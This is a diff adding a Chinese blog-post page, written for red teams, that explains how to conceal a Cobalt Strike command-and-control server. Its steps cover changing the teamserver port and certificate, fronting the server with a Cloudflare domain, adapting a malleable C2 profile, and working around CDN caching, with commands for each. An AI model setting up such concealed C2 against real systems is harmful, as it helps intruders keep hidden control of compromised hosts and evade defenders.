@@ -1,0 +1,972 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="通过各种手段一步步将C2的痕迹从网络空间中抹除">
+<meta property="og:type" content="article">
+<meta property="og:title" content="APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2022/04/13/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="通过各种手段一步步将C2的痕迹从网络空间中抹除">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117123922219.png">
+<meta property="article:published_time" content="2022-04-13T07:53:47.000Z">
+<meta property="article:modified_time" content="2022-04-13T08:39:40.724Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="投稿">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117123922219.png">
+  
+  
+  
+  <title>APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度 - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-04-13 15:53" pubdate>
+          2022年4月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          72 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月13日 下午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文首发于<a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/733-aptcsc2-profilecdn">火线安全社区</a>。</p>
+<p>这年头打个红队都不容易，想普普通通上个线，除了ByPassAV以外，还要应付各种流量审计和设备和威胁情报，一不留神VPS就被扒光了。最近也是一直在倒腾，看了很多文章，但没一个能完全满足要求，或者是按着指示走着走着发现掉坑里了，嗯。本文将通过各种手段一步步将C2的痕迹从网络空间中抹除，并详细记录一下过程，确保人人都能学会。我也按照工作量的大小划分了几个档位，可以按需选取方案。</p>
+<h1 id="0x02-我的环境"><a href="#0x02-我的环境" class="headerlink" title="0x02 我的环境"></a>0x02 我的环境</h1><p>CS 4.3</p>
+<p>centos 7</p>
+<p>nginx&#x2F;1.20.1</p>
+<p>caddy v2.4.6</p>
+<p>​	开始之前，想说明的是基本方案和普通方案都是网上一抓一大把，基本也都能成功。这里只是整合，以及介绍一些坑点。不会过多介绍原理，感谢师傅们的文章。</p>
+<h1 id="0x03-基本方案：更改端口与证书"><a href="#0x03-基本方案：更改端口与证书" class="headerlink" title="0x03 基本方案：更改端口与证书"></a>0x03 基本方案：更改端口与证书</h1><h2 id="更改端口"><a href="#更改端口" class="headerlink" title="更改端口"></a>更改端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim your_cs_path/teamserver<br></code></pre></td></tr></table></figure>
+
+<p>拉到最后可以看到启动CS的命令，将这个命令的50050改掉，换成自己喜欢的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=2333 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Duser.language=en -javaagent:hook.jar -classpath ./cobaltstrike.jar server.TeamServer $*<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="更改证书"><a href="#更改证书" class="headerlink" title="更改证书"></a>更改证书</h2><h3 id="方法一：使用keytool（不推荐）"><a href="#方法一：使用keytool（不推荐）" class="headerlink" title="方法一：使用keytool（不推荐）"></a>方法一：使用keytool（不推荐）</h3><p>修改CS文件夹中的cobaltstrike.store，输入如下命令后输入密码<code>123456</code>即可列出信息：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">keytool -list -v -keystore cobaltstrike.<span class="hljs-keyword">store</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117123922219.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117123922219"></p>
+<p>我们可以使用如下命令对该keystore进行修改：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -keystore cobaltstrike.store -storepass <span class="hljs-number">123456</span> -keypass <span class="hljs-number">123456</span> -genkey -keyalg RSA -alias <span class="hljs-number">360</span>.cn -dname <span class="hljs-string">&quot;CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN&quot;</span><br><br><span class="hljs-comment"># 参数说明如下</span><br><span class="hljs-comment"># -keytool -keystore cobaltstrike.store -storepass 密码</span><br><span class="hljs-comment"># -keypass 密码</span><br><span class="hljs-comment"># -genkey -keyalg RSA</span><br><span class="hljs-comment"># -alias google.com -dname CN=(名字与姓氏),</span><br><span class="hljs-comment"># OU=(组织单位名称), O=(组织名称),</span><br><span class="hljs-comment"># L=(城市或区域名称),</span><br><span class="hljs-comment"># ST=(州或省份名称),</span><br><span class="hljs-comment"># C=(单位的两字母国家代码)。</span><br></code></pre></td></tr></table></figure>
+
+<p>再次查看，能够发现特征已经被去除：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117124808794.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117124808794"></p>
+<h3 id="方法二：使用第三方提供的证书生成keystore（推荐）"><a href="#方法二：使用第三方提供的证书生成keystore（推荐）" class="headerlink" title="方法二：使用第三方提供的证书生成keystore（推荐）"></a>方法二：使用第三方提供的证书生成keystore（推荐）</h3><p>这个会在下面的几节中提到。</p>
+<h1 id="0x04-普通方案：使用Profile与CDN"><a href="#0x04-普通方案：使用Profile与CDN" class="headerlink" title="0x04 普通方案：使用Profile与CDN"></a>0x04 普通方案：使用Profile与CDN</h1><h2 id="域名申请（购买）与配置"><a href="#域名申请（购买）与配置" class="headerlink" title="域名申请（购买）与配置"></a>域名申请（购买）与配置</h2><p>​	免费的域名可以去<a target="_blank" rel="noopener" href="https://www.freenom.com/">Freenom</a> 要一个，也可以去<a target="_blank" rel="noopener" href="https://www.godaddy.com/">Godaddy</a>花十多块钱买一个。有了域名后直接接入Cloudflare，需要说明的是freenom的域名有的时候不能被Cloudflare识别，出现如下报错：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/19ec0a187cf1ed37ca8955a2c84ddf581e874f6f_2_690x481.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="Screenshot 2020-08-03 at 11.42.27 AM"></p>
+<p>​	遇到这种情况可以多申请几个网站或者过一段时间再试试，反正也不花钱:)。我遇到的情况是同一个免费域名，一开始接入Cloudflare的时候报如上错误，过了三天再尝试接入就成功了。</p>
+<p>​	接入后更改NS，按照Cloudflare的指示将域名的NS设置成Cloudflare的即可，这里不再赘述。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161754940.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117161754940"></p>
+<p>​	接入后配置一个DNS的A记录，解析到VPS的IP，后续上线用。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161259699.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117161259699"></p>
+<h2 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h2><p>​	Github上已经有非常多优秀的C2-Profile可以供我们使用了，我们需要使用Profile让Beacon和Teamserver之间的交互看起来尽可能像正常的流量。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a></li>
+</ul>
+<p>​	这里我使用的是后者jquery的profile。下载下来后需要根据我们的域名对Profile进行修改，以便能够上线HTTP&#x2F;HTTPS BEACON。需要修改的内容主要有四处，一个是https-certificate块中更改keystore和密码，keystore的生成马上讲：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117153504776.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117153504776"></p>
+<p>另外三个是http-stager、http-get、http-post块中的Host Header，Referer改不改可以随意。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117153855949.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117153855949"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117154138782.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117154138782"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117154233410.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117154233410"></p>
+<p>​	保存修改，然后准备我们的keystore。因为接入了CDN，所以证书我推荐直接使用Cloudflare提供的证书。CDN的坑会在下面讲。当然要是没有接入CDN的打算，可以使用letsencrypt这样的免费证书。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117155627953.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117155627953"></p>
+<p>使用默认配置生成证书和秘钥后，复制粘贴到你的服务器上，这里我选择的文件名是server.pem和server.key。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117155702840.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117155702840"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这里cdn.xxx.club是我的域名</span><br>openssl pkcs12 -<span class="hljs-built_in">export</span> -<span class="hljs-keyword">in</span> server.pem -inkey server.key -out cdn.xxx.club.p12 -name cdn.xxx.club -passout pass:123456<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cdn.xxx.club.store -srckeystore cdn.xxx.club.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="hljs-built_in">alias</span> cdn.xxx.club<br></code></pre></td></tr></table></figure>
+
+<p>​	在生成keystore文件后将该文件放在CS的根目录下，务必确保keystore文件名与密码和https-certificate中设置的一致。</p>
+<p>​	在一切准备就绪后可以使用CS自带的c2lint对profile语法进行检查，没有报错的话说明配置是ok的。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">./<span class="hljs-keyword">c</span><span class="hljs-number">2</span>lint jquery-<span class="hljs-keyword">c</span><span class="hljs-number">2.4</span>.<span class="hljs-number">3</span>.profile<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117160542580.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117160542580"></p>
+<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h3><p>Cloudflare默认的TLS配置为灵活，由于之前使用了Cloudflare给原服务器发的证书，我们可以改成完全（严格）提高安全性。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117162107561.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117162107561"></p>
+<h3 id="额外配置（坑）"><a href="#额外配置（坑）" class="headerlink" title="额外配置（坑）"></a>额外配置（坑）</h3><p>​	其他的Profile我还没测试过，但是应该都是通用的。</p>
+<h4 id="禁用缓存"><a href="#禁用缓存" class="headerlink" title="禁用缓存"></a>禁用缓存</h4><p>​	在这个Profile中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去缓存它，但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。我们可以使用开发模式并清除缓存，但是开发模式只有3小时。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117163757479.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117163757479"></p>
+<p>所以推荐的做法是创建Cloudflare规则，不代理js请求。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117163950904.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117163950904"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117164005728.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211117164005728"></p>
+<h4 id="Profile微调"><a href="#Profile微调" class="headerlink" title="Profile微调"></a>Profile微调</h4><p>​	据说在4.0版本的CS中，如果不调整Profile是可以上线，但是执行命令没有回显。而在4.3版本的CS中，不动Profile是直接上不了线。<br>我们需要更改Profile中的<strong>响应头</strong>配置，其中的<code>header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</code>修改为：<code>header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</code>即可正常执行命令回显。这里还是CDN的问题，但它具体做了什么让我们上不了线就不知道了。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>启动teamserver，设置profile为我们修改好的profile</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver your_ip your_pass jquery-c2.4.3.profile<br></code></pre></td></tr></table></figure>
+
+
+
+<p>​	在确保域名解析正确的情况下，此时HTTPS BEACON已经可以上线了，我们需要对CS的listener进行配置。填入三次你的域名，其他的默认就好。</p>
